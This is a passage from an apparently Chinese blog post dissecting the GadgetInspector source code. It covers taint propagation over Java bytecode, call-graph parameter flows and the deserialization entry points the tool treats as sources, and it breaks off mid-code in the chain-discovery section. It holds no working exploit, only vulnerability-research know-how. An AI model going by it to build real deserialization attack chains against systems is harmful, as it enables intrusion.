src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/16.png"></p><p>接下来第二步，也就是调用<code>B.method2</code>方法，这个稍微复杂一点，结合对应的汇编来理解呗</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public java.lang.String method2(java.lang.String);</span><br><span class="line">  Code:</span><br><span class="line">     0: new           #2                  // class yyds/C</span><br><span class="line">     3: dup</span><br><span class="line">     4: invokespecial #3                  // Method yyds/C.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">     7: aload_1</span><br><span class="line">     8: invokevirtual #4                  // Method yyds/C.method3:(Ljava/lang/String;)Ljava/lang/String;</span><br><span class="line">    11: areturn</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跳开第一步new，之后dup会触发<code>gadgetinspector.TaintTrackingMethodVisitor#visitInsn</code>，做的操作也很easy，可能觉得这个很不可思议很难理解，dup指令部分可以拉到最下面看看题外话部分呢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> Opcodes.DUP:</span><br><span class="line">  push(get(<span class="number">0</span>));</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>之后INVOKESPECIAL会触发<code>visitMethodInsn</code>，当然肉眼可知实例化C的时候与我们无关没啥好康的，之后又是<code>aload_1</code>去触发visitVarInsn的过程，这里逻辑类似我们第一步讲的那样没啥好说的呗，之后又是<code>invokevirtual</code>触发<code>visitMethodInsn</code>的调用也就是<code>new C().method3()</code>中调用方法3的过程，虽然结合注释也是能看懂的这里也简单说说</p><p>首先获取method参数类型，由于是非静态方法会进入if条件<img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/17.png"></p><p>之后构造了污染参数集合，for循环当中根据参数类型大小，从栈底获取入参，参数入栈是从右到左的</p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/18.png"></p><p>由于不是构造函数，会新建一个HashSet用于保存污染参数的返回值</p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/19.png"></p><p>之后判断是否和同一方法体内的其它方法返回值关联，有关联则添加到栈底，等待执行return时保存</p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/20.png"></p><p>至此我们也得到了我们可以污染B.method2，控制返回值</p><p>之后A.method1同C.method3就不再重复，最后分析的是main方法的入参args是否会污染到其返回值，也其实差不多，没必要再浪费笔墨了，看看下面反汇编代码即可，有兴趣可以自己更入具体过程看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Code:</span><br><span class="line">   0: new           #2                  // class yyds/A</span><br><span class="line">   3: dup</span><br><span class="line">   4: invokespecial #3                  // Method yyds/A.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">   7: aload_1</span><br><span class="line">   8: invokevirtual #4                  // Method yyds/A.method1:(Ljava/lang/String;)Ljava/lang/String;</span><br><span class="line">  11: astore_2</span><br><span class="line">  12: new           #5                  // class yyds/B</span><br><span class="line">  15: dup</span><br><span class="line">  16: invokespecial #6                  // Method yyds/B.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">  19: aload_2</span><br><span class="line">  20: invokevirtual #7                  // Method yyds/B.method2:(Ljava/lang/String;)Ljava/lang/String;</span><br><span class="line">  23: areturn</span><br></pre></td></tr></table></figure><p>至此我们得到了如下的结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yyds/<span class="function">C<span class="title">method3</span><span class="params">(Ljava/lang/String;)</span>Ljava/lang/String</span>;<span class="number">1</span>,</span><br><span class="line">yyds/<span class="function">B<span class="title">method2</span><span class="params">(Ljava/lang/String;)</span>Ljava/lang/String</span>;<span class="number">1</span>,</span><br><span class="line">yyds/<span class="function">A<span class="title">method1</span><span class="params">(Ljava/lang/String;)</span>Ljava/lang/String</span>;<span class="number">1</span>,</span><br><span class="line">yyds/<span class="function">Main<span class="title">main</span><span class="params">(Ljava/lang/String;)</span>Ljava/lang/String</span>;<span class="number">1</span>,</span><br></pre></td></tr></table></figure><h3 id="CallGraphDiscovery"><a href="#CallGraphDiscovery" class="headerlink" title="CallGraphDiscovery"></a>CallGraphDiscovery</h3><p>这个类主要是为了检查子方法的参数是否可以被父方法的参数所影响</p><p>也是从创宇当中的例子开始</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> MyObject obj;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parentMethod</span><span class="params">(Object arg)</span></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">    TestObject obj1 = <span class="keyword">new</span> TestObject();</span><br><span class="line">  Object obj2 = obj1.childMethod1(arg);</span><br><span class="line">  <span class="keyword">this</span>.obj.childMethod(obj2); </span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中如果没有生成passthrough数据流操作，就无法判断childMethod1的返回值是否会受到参数arg的影响，也就无法继续判断parentMethod的arg参数与子方法MyObject.childmethod的参数传递关系</p><p>也是先看原作者的例子以及创宇的师傅的原文帮助理解</p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/21.png-w331s"></p><p>AbstractTableModel$ff19274a.hashcode与子方法IFn.invoke：</p><ul><li>AbstractTableModel$ff19274a.hashcode的this(0参)传递给了IFn.invoke的1参，表示为0-&gt;IFn.invoke()@1</li><li>由于f是通过this.__clojureFnMap(0参)获取的，而f又为IFn.invoke()的this(0参)，即AbstractTableModel$ff19274a.hashcode的0参传递给了IFn.invoke的0参，表示为0-&gt;IFn.invoke()@0</li></ul><p>FnCompose.invoke与子方法IFn.invoke：</p><ul><li>FnCompose.invoked的arg(1参)传递给了IFn.invoke的1参，表示为1-&gt;IFn.invoke()@1</li><li>f1为FnCompose的属性(this，0参)，被做为了IFn.invoke的this(0参数)传递，表示为0-&gt;IFn.invoke()@1</li><li>f1.invoke(arg)做为一个整体被当作1参传递给了IFn.invoke，由于f1在序列化时我们可以控制具体是IFn的哪个实现类，所以具体调用哪个实现类的invoke也相当于能够控制，即f1.invoke(arg)这个整体可以视为0参数传递给了IFn.invoke的1参(这里只是进行的简单猜测，具体实现在字节码分析中，可能也体现了作者说的合理的风险判断吧)，表示为0-&gt;IFn.invoke()@1</li></ul><p>好吧返回正题，来到<code>gadgetinspector.CallGraphDiscovery#discover</code></p><p>会遍历每一个class，并传入<code>ModelGeneratorClassVisitor</code>进行观察，一样的这里加点代码跳过对构造函数的观察</p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/22.png"></p><p>首先是对B类进行观察，还是再列一次反汇编代码</p><pre><code>Code:   0: new           #2                  // class yyds/C   3: dup   4: invokespecial #3                  // Method yyds/C.&quot;&lt;init&gt;&quot;:()V   7: aload_1   8: invokevirtual #4                  // Method yyds/C.method3:(Ljava/lang/String;)Ljava/lang/String;  11: areturn</code></pre><p>长话短说，万物之源肯定还是visitCode，可以看到对于对于非静态方法会额外多一个arg0，不需要理解，本来Java底层就是这样子处理滴</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">super</span>.visitCode();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> localIndex = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> argIndex = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">//使用arg前缀来表示方法入参，后续用于判断是否为目标调用方法的入参</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">this</span>.access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123;</span><br><span class="line">    setLocalTaint(localIndex, <span class="string">&quot;arg&quot;</span> + argIndex);</span><br><span class="line">    localIndex += <span class="number">1</span>;</span><br><span class="line">    argIndex += <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (Type argType : Type.getArgumentTypes(desc)) &#123;</span><br><span class="line">    setLocalTaint(localIndex, <span class="string">&quot;arg&quot;</span> + argIndex);</span><br><span class="line">    localIndex += argType.getSize();</span><br><span class="line">    argIndex += <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据汇编由于会调用到<code>invokevirtual</code>,最终会触发<code>gadgetinspector.CallGraphDiscovery.ModelGeneratorMethodVisitor#visitMethodInsn</code>的调用，这里面就会记录最终结果，在代码当中有一些简单的过滤，比如这个arg，就是为了保证参数为当前方法的入参</p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/23.png"></p><p>之后便会在参数discoveredCalls当中记录参数流动关系</p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/24.png"></p><p>当然后面才发现这里还有一个细节的点，我们加强难度，如果代码改为这样，可以看到在上面基础上只是加了个成员变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> yyds;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> AA().method1(args, name);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AA</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">method1</span><span class="params">(String param, String param2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> param + param2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看看他的反汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Code:</span><br><span class="line">   0: new           #2                  // class yyds/AA</span><br><span class="line">   3: dup</span><br><span class="line">   4: invokespecial #3                  // Method yyds/AA.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">   7: aload_1</span><br><span class="line">   8: aload_0</span><br><span class="line">   9: getfield      #4                  // Field name:Ljava/lang/String;</span><br><span class="line">  12: invokevirtual #5                  // Method yyds/AA.method1:(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;</span><br><span class="line">  15: pop</span><br><span class="line">  16: return</span><br></pre></td></tr></table></figure><p>其实和上面分析过程差不多的，唯一多了个区别就是多了个汇编指令<code>getfield</code>的调用，也因此会触发<code>visitFieldInsn</code>，我们具体来看看<code>gadgetinspector.CallGraphDiscovery.ModelGeneratorMethodVisitor#visitFieldInsn</code>，其实就是判断字段是否是transient的，逻辑也很简单，看注释即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitFieldInsn</span><span class="params">(<span class="keyword">int</span> opcode, String owner, String name, String desc)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.GETSTATIC:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.PUTSTATIC:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.GETFIELD:<span class="comment">//入操作栈</span></span><br><span class="line">            Type type = Type.getType(desc);</span><br><span class="line">            <span class="keyword">if</span> (type.getSize() == <span class="number">1</span>) &#123;</span><br><span class="line">                Boolean isTransient = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// If a field type could not possibly be serialized, it&#x27;s effectively transient</span></span><br><span class="line">                <span class="keyword">if</span> (!couldBeSerialized(serializableDecider, inheritanceMap, <span class="keyword">new</span> ClassReference.Handle(type.getInternalName()))) &#123;</span><br><span class="line">                    isTransient = Boolean.TRUE;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    ClassReference clazz = classMap.get(<span class="keyword">new</span> ClassReference.Handle(owner));</span><br><span class="line">                    <span class="keyword">while</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (ClassReference.Member member : clazz.getMembers()) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (member.getName().equals(name)) &#123;</span><br><span class="line">                                isTransient = (member.getModifiers() &amp; Opcodes.ACC_TRANSIENT) != <span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (isTransient != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        clazz = classMap.get(<span class="keyword">new</span> ClassReference.Handle(clazz.getSuperClass()));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Set&lt;String&gt; newTaint = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">                <span class="keyword">if</span> (!Boolean.TRUE.equals(isTransient)) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (String s : getStackTaint(<span class="number">0</span>)) &#123;</span><br><span class="line">                        newTaint.add(s + <span class="string">&quot;.&quot;</span> + name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line">                <span class="comment">//在调用方法前，都会先入栈，作为参数</span></span><br><span class="line">                setStackTaint(<span class="number">0</span>, newTaint);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.PUTFIELD:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这一部分也算完结了</p><h3 id="SourceDiscovery"><a href="#SourceDiscovery" class="headerlink" title="SourceDiscovery"></a>SourceDiscovery</h3><p>在gadgetinspector中，存在着多个SourceDiscovery的实现，有jackson的，java原生序列化的等等，我这里主要以jackson的SourceDiscovery实现开始分析</p><p>首先在SourceDiscovery抽象类的discover当中，先是加载了所有的类、方法、继承实现关系的数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();</span><br><span class="line">  Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">  InheritanceMap inheritanceMap = InheritanceMap.load();</span><br><span class="line"></span><br><span class="line">  Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">  <span class="keyword">for</span> (GraphCall graphCall : DataLoader.loadData(Paths.get(<span class="string">&quot;callgraph.dat&quot;</span>), <span class="keyword">new</span> GraphCall.Factory())) &#123;</span><br><span class="line">    MethodReference.Handle caller = graphCall.getCallerMethod();</span><br><span class="line">    <span class="keyword">if</span> (!graphCallMap.containsKey(caller)) &#123;</span><br><span class="line">      Set&lt;GraphCall&gt; graphCalls = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">      graphCalls.add(graphCall);</span><br><span class="line">      graphCallMap.put(caller, graphCalls);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      graphCallMap.get(caller).add(graphCall);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  discover(classMap, methodMap, inheritanceMap, graphCallMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来调用discover在实现类<code>gadgetinspector.javaserial.SimpleSourceDiscovery#discover</code>,主要是收集可用的source，逻辑也很简单了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span></span><br><span class="line"><span class="params"><span class="function">                         Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span></span><br><span class="line"><span class="params"><span class="function">                         InheritanceMap inheritanceMap)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> SerializableDecider serializableDecider = <span class="keyword">new</span> SimpleSerializableDecider(inheritanceMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;finalize&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;()V&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If a class implements readObject, the ObjectInputStream passed in is considered tainted</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;readObject&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;(Ljava/io/ObjectInputStream;)V&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Using the proxy trick, anything extending serializable and invocation handler is tainted.</span></span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle clazz : classMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(clazz))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(clazz, <span class="keyword">new</span> ClassReference.Handle(<span class="string">&quot;java/lang/reflect/InvocationHandler&quot;</span>))) &#123;</span><br><span class="line">                MethodReference.Handle method = <span class="keyword">new</span> MethodReference.Handle(</span><br><span class="line">                        clazz, <span class="string">&quot;invoke&quot;</span>, <span class="string">&quot;(Ljava/lang/Object;Ljava/lang/reflect/Method;[Ljava/lang/Object;)Ljava/lang/Object;&quot;</span>);</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// hashCode() or equals() are accessible entry points using standard tricks of putting those objects</span></span><br><span class="line">        <span class="comment">// into a HashMap.</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;hashCode&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;()I&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;(Ljava/lang/Object;)Z&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Using a comparator proxy, we can jump into the call() / doCall() method of any groovy Closure and all the</span></span><br><span class="line">        <span class="comment">// args are tainted.</span></span><br><span class="line">        <span class="comment">// https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Groovy1.java</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">&quot;groovy/lang/Closure&quot;</span>))</span><br><span class="line">                    &amp;&amp; (method.getName().equals(<span class="string">&quot;call&quot;</span>) || method.getName().equals(<span class="string">&quot;doCall&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                Type[] methodArgs = Type.getArgumentTypes(method.getDesc());</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methodArgs.length; i++) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, i + <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="GadgetChainDiscovery"><a href="#GadgetChainDiscovery" class="headerlink" title="GadgetChainDiscovery"></a>GadgetChainDiscovery</h3><p>接下来就是最重要的生成利用链的部分了，这部分整合了上面所有的信息，会遍历全部的source，并在callgraph.dat中递归查找所有可以继续传递污点参数的子方法调用，直至遇到sink标记的方法，看看discover即可，带了备注</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 